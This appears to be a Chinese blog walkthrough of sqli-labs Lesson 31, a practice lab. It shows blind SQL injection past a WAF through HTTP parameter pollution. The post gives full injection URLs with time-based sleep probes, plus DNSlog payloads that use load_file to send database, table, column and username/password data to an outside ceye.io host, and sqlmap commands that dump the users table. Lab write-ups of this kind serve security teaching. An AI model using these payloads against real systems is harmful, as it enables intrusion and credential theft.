---
title: sqli-labs lession-31 GET盲注-阻抗不匹配-有WAF的web应用
date: 2018-10-14 17:44:55
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession-31 GET盲注-阻抗不匹配-有WAF的web应用

---

## 登录界面

![001](/img/sql/Lesson-31/001.png)

## 分析

除了闭合方式不一样,和Lesson-29和Lesson-30有什么区别。修改代码为时间盲注,用DNSlog做。

修改代码如下：

```
$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
	$result=mysql_query($sql);
	$row = mysql_fetch_array($result);
	if($row)
	{
	  	//echo "<font size='5' color= '#99FF00'>";	
	  	//echo 'Your Login name:'. $row['username'];
	  	//echo "<br>";
	  	//echo 'Your Password:' .$row['password'];
		echo '<font color= "#FFFF00">';
		echo 'Hello World';
	  	echo "</font>";
  	}
	else 
	{
		echo '<font color= "#FFFF00">';
		echo 'Hello World';
		//print_r(mysql_error());
		echo "</font>";  
	}
```

## 注入

利用http://ceye.io  环境的DNSlog

### 判断类型

`http://192.168.75.133/sql/Less-31/login.php?id=1&id=2") and if(1,sleep(60),null)%23`

![002](/img/sql/Lesson-31/002.png)

![003](/img/sql/Lesson-31/003.png)

判断为用`")`闭合

### 获取列数

`http://192.168.75.133/sql/Less-31/login.php?id=1&id=2") union select 1,2,3 and if(1,sleep(60),null)%23`

![004](/img/sql/Lesson-31/004.png)

### 获取数据库名

这里我原来的环境的ip地址访问不到dns。虚拟机环境切换成桥接。

`http://10.60.250.250/sql/Less-31/login.php?id=1&id=2") union select 1,(select load_file(concat('\\\\',(select database()),'.域名.ceye.io\\abc'))),3%23`

![005](/img/sql/Lesson-31/005.png)

### 获取表名

只能一个一个获取

`http://10.60.250.250/sql/Less-31/login.php?id=1&id=2") union select 1,(select load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema='security' limit 3,1) ,'.kg74jx.ceye.io\\abc'))),3%23`

![006](/img/sql/Lesson-31/006.png)

### 获取列名

`http://10.60.250.250/sql/Less-31/login.php?id=1&id=2") union select 1,(select load_file(concat('\\\\',(select (column_name) from information_schema.columns where table_name='users' and table_schema='security' limit 2,1) ,'.kg74jx.ceye.io\\abc'))),3%23`

![007](/img/sql/Lesson-31/007.png)

### 获取字段

`http://10.60.250.250/sql/Less-31/login.php?id=1&id=2") union select 1,(select load_file(concat('\\\\',(select concat(username,'_',password) from users limit 1,1) ,'.kg74jx.ceye.io\\abc'))),3%23`

![008](/img/sql/Lesson-31/008.png)

## SQLMAP

```
--technique T:注入方式为时间注入
--dbms 10：后端数据库设置为mysql
--threads 10:并发线程设置为10
--flush-session:刷新session
--fresh-queries:发起新查询
-v 3：显示测试过程
```

`sqlmap -u http://10.60.250.250/sql/Less-31/login.php?id=1&id=2 --dbms mysql --technique T --level 2 --threads 10 -v 3 --flush-session --fresh-queries`

![009](/img/sql/Lesson-31/009.png)

`sqlmap -u "http://10.60.250.250/sql/Less-31/login.php?id=1&id=2" --dbms mysql --technique T --level 2 --threads 10 -v 3 --dbs`

![010](/img/sql/Lesson-31/010.png)

`sqlmap -u "http://10.60.250.250/sql/Less-31/login.php?id=1&id=2" --dbms mysql --technique T --level 2 --threads 10 -D security --tables`

![011](/img/sql/Lesson-31/011.png)

`sqlmap -u "http://10.60.250.250/sql/Less-31/login.php?id=1&id=2" --dbms mysql --technique T --level 2 --threads 10 -D security -T users --columns --dump`

![012](/img/sql/Lesson-31/012.png)